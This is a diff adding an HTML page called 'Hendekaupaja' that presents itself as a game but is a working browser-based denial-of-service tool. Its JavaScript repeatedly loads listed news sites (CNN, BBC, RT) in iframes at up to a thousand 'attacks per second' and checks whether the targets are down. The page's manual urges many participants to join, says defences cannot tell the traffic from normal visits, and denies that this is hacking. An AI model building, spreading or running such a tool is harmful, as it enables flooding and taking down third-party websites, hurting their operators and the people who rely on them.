@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+	<link rel="icon" href="logo.png">
+    <link rel="shortcut icon" href="logo.png">
+
+	<title>Hendekaupaja</title>
+	
+	<meta name="Description" content="">
+	
+	<meta property="og:type"               content="Game" />
+	<meta property="og:title"              content="" />
+	<meta property="og:description"        content="" />
+	<meta property="og:image"              content="logo.png" />
+
+	<!-- Style -->
+	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+	
+	
+	<!-- Java Script -->
+	<script src="https://code.jquery.com/jquery-3.2.1.min.js" crossorigin="anonymous"></script>
+  
+	<script type="text/javascript">
+		//Attack variables
+		var attackFrequency = 1000;
+		var counter = 0;
+		
+		//List of websites | source: http://www.naslovi.net/izvor/
+		//data | frequency - based on view public view count, alexa..
+		var mediaList = {
+			"http://www.cnn.com":"7",
+			"http://www.bbc.com":"7",
+			"http://www.rt.com":"7"
+		};
+			
+		var mediaListGenerated = [];
+		
+		$(document).ready(function() {
+			
+			var colorR = Math.floor((Math.random() * 256));
+			var colorG = Math.floor((Math.random() * 256));
+			var colorB = Math.floor((Math.random() * 256));
+			$("#body").css("background-color", "rgba(" + colorR + "," + colorG + "," + colorB + ", 0.4)");
+			
+			$("#hedenkaupaja").click(function(){
+				$("#hedenkaupaja-content").slideToggle( "slow" );
+			});
+			
+		
+			//Prepare media list
+			prepareMedia();
+			
+			//Prepare media list for view
+			$.each(mediaList, function(index, item) {
+				$("#media-list .pool").append('<a href="' + index + '" class="btn btn-default btn-xs">' + index.replace("http://","").replace("https://","") + '</span> ');
+			});
+				
+			//Start ping sequence 
+			$("#pingSequence").click(function(e){
+				e.preventDefault();
+				
+				//Loop all media from generated list
+				for (var i = mediaListGenerated.length - 1; i >= 0; i--) {
+					ping(mediaListGenerated[i]);
+				};
+			});
+		
+			//Start/Stop attack
+			$("#defendMeUs").click(function(e) {
+				e.preventDefault();
+				
+				//Defent button control
+				if($(this).hasClass("btn-danger")) {
+					//Start defending
+					defend = setInterval(attack, attackFrequency);	
+					
+					//Change back the look			
+					startDefending();
+				} else {				
+					//StopDefending
+					if(typeof defend != 'undefined'){
+						clearInterval(defend);
+					}
+					
+					//Change back the look
+					stopDefending();		
+				}
+			});
+			
+			//Change frequency
+			$("#attackFrequency").change(function() {
+				attackFrequency = this.value;
+				
+				if(typeof defend != 'undefined'){
+					//Stop defending
+					clearInterval(defend);		
+					startDefending();
+				} else {
+					//Change back the look			
+					startDefending();
+				}
+				//Start Defending
+				defend = setInterval(attack, attackFrequency);
+			});
+			
+			//Remove media from list
+			$(".pool a").click(function(e){
+				e.preventDefault();
+				
+				var removedMedia = $(this).attr("href");
+				
+				//remove from media list
+				mediaListGenerated = jQuery.grep(mediaListGenerated, function( n, i ) {
+					return ( n !== removedMedia );
+				});
+				
+				//Remove item from view
+				$(this).remove();
+			});
+		});
+		
+		//Start defending function
+		function startDefending(){
+			//Change button
+			$("#defendMeUs").html('Game is On <span class="glyphicon glyphicon-ok pull-right" aria-hidden="true"></span>');
+			$("#defendMeUs").removeClass("btn-danger").addClass("btn-success");
+			
+			//Change labels
+			$("#label-media, #label-start, #label-openpage").removeClass("hidden");
+		}
+		
+		//Stop defending function
+		function stopDefending() {
+			//Change button
+			$("#defendMeUs").html('Start game <span class="glyphicon glyphicon-play pull-right" aria-hidden="true"></span>');
+			$("#defendMeUs").removeClass("btn-success").addClass("btn-danger");
+			
+			//Change labels
+			$("#label-media, #label-start, #label-openpage").addClass("hidden");
+		}
+		
+		function attack() {
+			//Current attack
+			currentAttack = mediaListGenerated[Math.floor(Math.random() * mediaListGenerated.length)];
+			
+			//Show as title
+			$("#currentAttack").text(currentAttack.replace("http://","").replace("https://",""));
+			
+			//Mark in list
+			$(".pool a.btn-danger").removeClass("btn-danger");
+			$('.pool a[href="' + currentAttack + '"]').addClass("btn-danger");
+			
+			//Attack
+			$("#attack-container iframe").remove();
+			$("#attack-container").append('<iframe width="380" height="220" src="' + currentAttack + '" frameborder="0"></iframe>');
+			
+			//Count attacks
+			$(".counter .label").text(counter.toLocaleString());
+		   	counter++;
+		}
+		
+		//Prepare media list. Remove items if user removed them from list and calculate frequency
+		function prepareMedia() {
+			//Generate media list
+			$.each(mediaList, function(index, item) {
+				for(var i = 0; i < item; i++) {
+					mediaListGenerated.push(index);
+				}
+			});
+		}
+		
+		//Check current status
+		function ping(mediaUrl){
+			$.ajax({
+				url: mediaUrl,
+				type: "GET",
+				timeout: 3000,
+				success: function() {
+					$('.pool a[href="' + mediaUrl + '"]').removeClass("btn-default").addClass("btn-info");
+				},
+				error: function(x, t, m) {
+					if(t == "timeout") {
+						$('.pool a[href="' + mediaUrl + '"]').removeClass("btn-default, btn-info").addClass("btn-success");
+					} else {
+						$('.pool a[href="' + mediaUrl + '"]').removeClass("btn-default, btn-info").addClass("btn-info");
+					}
+				}
+			});
+		}
+	</script>
+	
+	<style>
+		@import url('https://fonts.googleapis.com/css?family=Open+Sans:400,600,700');
+		
+		body {
+			font-family: 'Open Sans', sans-serif;
+			font-size:13px;
+			background: url("bg.png") no-repeat center top;
+		}
+		header {
+			background-color: #ce0707;
+			padding-top: 3px;
+			padding-bottom: 3px;
+			font-size: 10px;
+			color: rgba(255, 255, 255, 0.72);
+			line-height: 19px;
+		}
+		header a {
+			font-size: 10px;
+			color: rgba(255, 255, 255, 0.72);
+		}
+		header a:hover {
+			color: #ffffff;
+		}
+		#notice {
+			display: none;
+			background-color: #000;
+			padding: 20px;
+			text-align: center;
+			text-transfrom: uppercase;
+			font-weight: bold;
+			color: #fff;
+		}
+		#weapon {
+			background-color: rgba(0, 0, 0, 0.08);
+			padding-top: 40px;
+			padding-bottom: 50px;
+		}
+		#media-list {
+			background-color: rgba(0, 0, 0, 0.04);
+			padding-top: 80px;
+			padding-bottom: 210px;
+		}
+		#media-list h3 {
+			background-color: rgba(255, 255, 255, 0.35);
+			padding: 10px;
+			border-radius: 8px;
+			font-weight: bold;
+			color: #ffffff;
+			text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.24);
+			maring-bottom: 0px !important;
+		}
+		#attackFrequency {
+			margin-bottom: 6px;
+		}
+		#attack-container {
+			height: 220px;
+			width: 100%;
+			overflow: hidden;
+			background-color: #353535;
+			border: 3px solid #292929;
+			box-shadow: 2px 1px 3px rgba(12, 12, 12, 0.3);
+			border-radius: 8px;
+		}
+		#planAndGoal {
+			background-color: rgba(0, 0, 0, 0.08);
+			padding-top: 40px;
+			padding-bottom: 50px;
+		}
+		#manual {
+			font-size: 13px;
+			color: #525252;
+			padding-top: 30px;
+			padding-bottom: 30px;
+			background-color: rgba(255, 255, 255, 0.42);
+		}
+		#code {
+			background-color: rgba( 210, 210, 210, .2 );
+			padding-top: 30px;
+			padding-bottom: 30px;
+			font-size: 11px;
+		}
+		
+		#defendMeUs {
+			margin-top: 25px;
+			margin-bottom: 20px;
+			min-width: 220px;
+		}
+		
+		#weapon .label {
+			line-height: 30px;
+			font-size: 20px;
+		}
+		.pool {
+			background-color: rgba(255, 255, 255, 0.35);
+			padding: 10px;
+			border-radius: 8px;
+			font-weight: bold;
+			color: #ffffff;
+			text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.24);
+		}
+		.pool a {
+			margin-bottom: 7px;
+			margin-right: 7px;
+		}
+		#hedenkaupaja {
+			cursor: pointer;
+		}
+		#hedenkaupaja h1 {
+			margin-top: 26px;
+		}
+		#hedenkaupaja-content {
+			margin-top: 30px;
+			margin-bottom: 30px;
+			display: none;
+		}
+		#pingSequence {
+			margin-top: 2px;
+		}
+		
+		@media only screen and (max-width: 500px) {
+			#notice {
+				display: block;
+			}
+		}
+		
+	</style>
+</head>
+<body id="body">
+	<header>
+		<div class="container">
+			<div class="pull-left">
+				Game: <strong>Name_of_game</strong> | <a href="#" target="_blank">www.mainwebsite.com</a> | <a href="https://github.com/zoranspasic1980y/hendekaupaja" target="_blank">Source Github</a> | <a href="https://github.com/zoranspasic1980y/hendekaupaja/archive/master.zip" target="_blank">Download</a>
+			</div>
+		</div>
+	</header>
+	<div id="notice">
+		Warning: Game is using a lot of megabytes, it's not recommended to use it using GPRS connection
+	</div>
+	<div id="weapon">
+		<div class="container">
+			<div class="row">
+				<div class="col-md-3">
+					<a href="#" class="btn btn-lg btn-default btn-danger" id="defendMeUs">
+						Name_of_game
+						<span class="glyphicon glyphicon-play pull-right" aria-hidden="true"></span>
+					</a>
+				</div>
+				
+				<div class="col-md-3 col-md-offset-1">
+					<h4>Attacks per second:</h4>
+					<select class="form-control input-sm2" id="attackFrequency">
+						<option value="1">1000</option>
+						<option value="2">500</option>
+						<option value="4">250</option>
+						<option value="10">100</option>
+						<option value="20">50</option>
+						<option value="100">10</option>
+						<option value="1000" selected>1</option>
+					</select>
+					<p class="small">
+						<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> Option for slower PC's and internet connection. Change number of attacks accordingly.
+					</p>
+				</div>
+				
+				<div class="col-md-3 col-md-offset-1">
+					<h4>Total number of attacks:</h4>
+					<div class="counter">
+						<span class="label label-danger">0</span>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="media-list">
+		<div class="container">
+			<div class="row">
+				<div class="col-md-8">
+					<h3>List of websites 
+						 <a href="#" class="btn btn-xs btn-warning pull-right" id="pingSequence"><span class="glyphicon glyphicon-eye-open" aria-hidden="true"></span> Status</a>
+					</h3>
+					<div class="pool">
+					
+					</div>
+					<br/>
+					<p class="small">
+						<span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> If you find that some of the websites in the list shouldnt be attacked, you can remove them by clicking on them.
+					</p>
+					<p class="small">
+						 Legend: <span class="label label-default">Start</span> | <span class="label label-success">Shotdown</span> | <span class="label label-info">Works normal</span> | <span class="label label-danger">Ander attack</span>
+					</p>
+				</div>
+				<div class="col-md-4">
+					<h3 id="currentAttack">.</h3>
+					<div id="attack-container">
+					
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>	
+	
+	<!-- Plan and Goal -->
+	<div id="planAndGoal">
+		<div  class="container">
+			<div class="row">
+				<div class="col-md-6">
+					<h3>Describe the mining of the game</h3>
+					<p>
+						....
+					</p>
+					<h3>Game plan</h3>
+					<p>
+						1. Start the game by opening HTML file or visiting some of the game websites. <span class="glyphicon glyphicon-ok" aria-hidden="true"></span><br/>
+						2. Choose websites and remove the ones you might like. <span id="label-media" class="glyphicon hidden glyphicon-ok" aria-hidden="true"></span></br>
+						3. Click on button "<strong>Start game<span class="glyphicon glyphicon-play" aria-hidden="true"></span></strong>" and start attacks. <span id="label-start" class="glyphicon glyphicon-ok hidden" aria-hidden="true"></span></br>
+						4. As long as this page is open game is on and attacks are happening.<span id="label-openpage" class="glyphicon glyphicon-ok hidden" aria-hidden="true"></span> <br/>
+						5. After some time websites may block you or shut down.
+					</p>
+					
+				</div>
+				
+				<div class="col-md-6">
+					<h3>Goal of the game</h3>
+					<p>
+						Description
+					</p>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- END Plan and Goal -->
+	
+	<!-- Manual -->
+	<div id="manual">
+		<div class="container">
+			<div class="row" id="hedenkaupaja">
+				<div class="col-md-6">
+					<img src="logo.png" class="pull-left" style="padding-right: 20px;" width="110" />
+					<h1>Hendekaupaja</h1>
+				</div>
+			</div>
+				
+			<div class="row" id="hedenkaupaja-content">
+				<div class="col-md-6">
+					<h3>Starting the game</h3>
+					<p>
+						By clicking on button "Start game" number of calls will be made towards choosen websites. </br>
+						Those are normal HTTP calls just like you have opened the website in normal way. </br>
+							- This is in a way main adventage of game, defence systems are not going to able to difference this call from normal call.
+					</p>					
+					
+					<h3>Power of the game</h3>
+					<p>
+						Starting the game and power is in humans. As larger number if humans play the game, so the power will increase.
+					</p>					
+					
+					<h3>Defence from game</h3>
+					<p>
+						System will try to defend. Certain percent of humans will be temporarily or permanently blocked.
+						</br>
+						But in the end if everybody is blocked, there will be no one to access websites and their purpose would not exists.
+					</p>				
+				</div>
+				
+				<div class="col-md-6">			
+					
+					<h3>Check what the game is doing</h3>
+					<p>
+						Game contains set of instructions. They are written in text in file which is the game. Before using you sould read in text editor the game. In game file there should be the same website list as the one you can see when you start the game in browser.(This is due to the assumption that game will be changed in future by everybody.)
+					</p>	
+					<h3>How do I know if the game is working?</h3>
+					<p>
+						When the game is on and started  try to open some of the websites in separate browser. If the game is working you can expect website to open slower or get blank page in next 30s. There will be different periods during attack, sometimes website will be working but slow. 
+					</p>	
+					<h3>Is this hacking?</h3>
+					<p>
+						No. This game will push the working limits of websites servers and network. It will also start defence mechanisms of websites to block you. You are basically opening page 10, 100 times per second, which will be the same if you would press F5 on keyboard and refresh the page.
+					</p>
+					
+					<h3>How long will the game last?</h3>
+					<p>
+						Days, months maybe. Game sould not be used when the goal is achieved.
+					</p>					
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- END Manual -->
+	
+	<!-- Code -->	
+	<div id="code">
+		<div class="container">
+			<div class="row">
+				<div class="col-md-12">
+					Version: 1.4 | Datum: 22.04.2017
+					</br>
+					</br>
+					<span class="small">
+					Licence <a href="http://www.wtfpl.net/about/" target="_blank">WTFPL</a>..
+					</br>Created by free citizens of Serbia. We are not paid by anyone, no one gave money to create this game or is expecting any gain from it. </span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<!-- END Code -->
+	
+<!-- LICENCE | FTFPL | http://www.wtfpl.net/about/ 
+
+            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
+                    Version 2, December 2004
+
+ Copyright (C) 2004 Sam Hocevar <sam@hocevar.net>
+
+ Everyone is permitted to copy and distribute verbatim or modified
+ copies of this license document, and changing it is allowed as long
+ as the name is changed.
+
+            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE
+   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
+
+  0. You just DO WHAT THE FUCK YOU WANT TO.
+-->
+</body>
+</html>
+
+
